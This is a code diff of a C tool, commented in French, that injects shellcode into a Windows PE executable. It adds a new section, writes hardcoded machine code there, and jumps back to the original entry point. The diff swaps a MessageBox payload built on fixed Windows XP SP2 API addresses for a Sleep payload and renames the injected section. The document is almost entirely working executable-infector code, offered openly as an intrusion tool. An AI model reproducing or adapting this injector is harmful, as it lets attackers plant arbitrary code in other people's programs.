@@ -23,25 +23,33 @@ int main(int argc , char* argv[])
      "\xff\x2E\x30\x76\x65\x72\x2E\x4e"
      "\xE9"; // notre jump !
 */
-char shellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
-"\x77\x1d\x80\x7c"    //***LoadLibraryA(libraryname) IN WinXP sp2***
-"\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
-"\x28\xac\x80\x7c"   //***GetProcAddress(hmodule,functionname) IN sp2***
-"\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
-"\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
-"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
-"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
-"\xff\x4f\x6d\x65\x67\x61\x37\x4e"
+
+char shellcode[] =
+// page 608 doc Intel
+/*Sleep(5000)*/
+//sleep V2 sqns 0
+"\x33\xc0"          		// XOR EAX,EAX
+"\x66\xb8\x37\x13"     		//MOV AX,1337
+"\x50"             			//PUSH EAX   
+"\xb8\x42\x24\x80\x7c" 	// mov eax, 7c802442h
+"\xff\xd0" 				//far call eax
+
+
+
+/*Jmp Previous entry Point*/
+//"\xb8\x30\x11\x40\x00"       // mov eax,<START>  
+ //"\xff\xe0" // jmp near eax
+"\xe9"
 ;
 
-    long tailleSection = strlen(shellcode) + (sizeof(DWORD)); //notre dword sur lequel nous allons sauter, le veritable entry point.
+    long tailleSection = strlen(shellcode) + 0 + (sizeof(DWORD)); //notre dword sur lequel nous allons sauter, le veritable entry point.
 
     printf("Ownz fucking PE par 0vercl0k.\n\n");
     if(!argv[1])
 	{
 	printf(USAGE, argv[0]);
 	return 1;
-		}
+	}
 
     PIMAGE_DOS_HEADER infosExecutable;
     PIMAGE_NT_HEADERS infosPE;
@@ -85,7 +93,7 @@ char shellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
 	__in  SIZE_T dwNumberOfBytesToMap
 	);
 	*/
-	// a verifier les 3 derniers params
+	
 	LPVOID executableEnMemoire = MapViewOfFile(executableMappe , FILE_MAP_ALL_ACCESS , 0 ,  0, 0); 
 
     if (executableHandle == INVALID_HANDLE_VALUE || executableMappe == INVALID_HANDLE_VALUE || executableEnMemoire == INVALID_HANDLE_VALUE)
@@ -118,16 +126,16 @@ char shellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
 
 
     PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
-    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER)) * (infosPE->FileHeader.NumberOfSections)));
+    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
 
 
     PIMAGE_SECTION_HEADER notreSection = (PIMAGE_SECTION_HEADER)(infosSection);
-    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); //On retrouve l'addr de l'entete précédent pour calculé la vsize et voffset.
+    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); //On retrouve l'addr de l'entete précédent pour calculerla vsize et voffset.
 
     (*pointeurNombreDeSection)++;
     (*pointeurSizeOfImage) += tailleSection;
 
-    char* nomSection = ".0wned."; //7char + \0 => tjrs 8chars.
+    char* nomSection = ".newsection"; //7char + \0 => tjrs 8chars.
 
     strcpy((char*)notreSection->Name,nomSection);
     notreSection->Misc.VirtualSize = AligneSur(sectionAlignment,tailleSection);
@@ -155,9 +163,10 @@ char shellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
     HANDLE fp = CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
     SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN); /*0 added*/
 
-    WriteFile(fp,shellcode,strlen(shellcode),&taille,NULL);//on écrit notre shellcode.
+    WriteFile(fp,shellcode,(strlen(shellcode) + 0),&taille,NULL);//on écrit notre shellcode.
     WriteFile(fp,&decallage,sizeof(DWORD),&taille,NULL);// notre adresse sur laquel jump !
-    int i;
+    printf("&decallage %p \n", &decallage);
+	int i;
     for (i =  0; i < differenceDeTaille ; i++)
 	{
 		WriteFile(fp,"\x90",1,&taille,NULL);
